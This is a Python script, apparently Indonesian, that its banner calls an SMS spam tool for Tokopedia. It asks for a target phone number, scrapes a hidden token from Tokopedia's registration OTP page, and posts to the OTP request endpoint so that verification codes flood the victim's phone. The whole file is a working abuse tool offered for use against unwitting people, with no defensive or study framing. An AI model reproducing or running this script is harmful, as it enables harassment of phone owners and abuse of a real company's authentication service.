try:
     #from requests import get, post
     import requests, re
except ModuleNotFoundError as ok:
      print (ok)
class ok():
       def __init__(self):
              self.whut = requests.Session()
              self.headersto = {
                          'upgrade-insecure-requests': '1',
                          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
                          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
                          'sec-fetch-site': 'same-site',
                          'referer': 'https://www.tokopedia.com/register',
                         }
              self.response = self.whut.get(f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={o}&ld=https://accounts.tokopedia.com/register?type=phone&phone=&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjp0cnVlLCJib3QiOmZhbHNlLCJnYyI6ZmFsc2V9", headers=self.headersto).content
              self.oax = re.findall(r'id="Token" value="(.*?)" type="hidden', str(self.response))[0]
#########################
       def okx(self):
           self.data = {
                'tk': (self.oax),
                'otp_type': '116',
                'msisdn': (o),
                'email': '',
                'original_param': ''
                 }
           self.heade = {
                    'origin': 'https://accounts.tokopedia.com',
                    'accept-encoding': 'gzip, deflate, br',
                    'x-requested-with': 'XMLHttpRequest',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    }
           resp = self.whut.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=self.heade, data=self.data).text
           print (resp)
if __name__ == '__main__':
    b = """
           \033[31;1m============\033[1;33m============\033[1;92m================
           \033[31;1m• AUTHOR : All-Alvian                  •
           \033[1;33m• TEAM : AllTEAM                       •
           \033[1;92m• GITHUB : https://github/All-Alvian   •
           \033[1;92m• CONTACT : +62856976807xx             •
           \033[31;1m============\033[1;33m============\033[1;92m================
                     \033[31;1mSPAM\033[1;33m SMS\033[1;92m TOKOPEDIA
 \033[31;1m         SPAM SMS INI\033[1;33m HANYA BISA DI\033[1;92m PAKE 3x SENOMOR 
      """
try:
    print(str(b)) 
    o =input(f"\033[31;1mNOMOR\033[1;33m TARGET\033[1;92m ANDA : ")
    ox = ok()
    ox.okx()   
except KeyboardInterrupt:
    print ('\033[31;1mEror Sayang\033[1;33m Oh Lu\033[1;92m Mao Keluar...')
else:
    print ('\033[31;1mOK Udh\033[1;33m Msuk\033[1;92m Ke Target...')
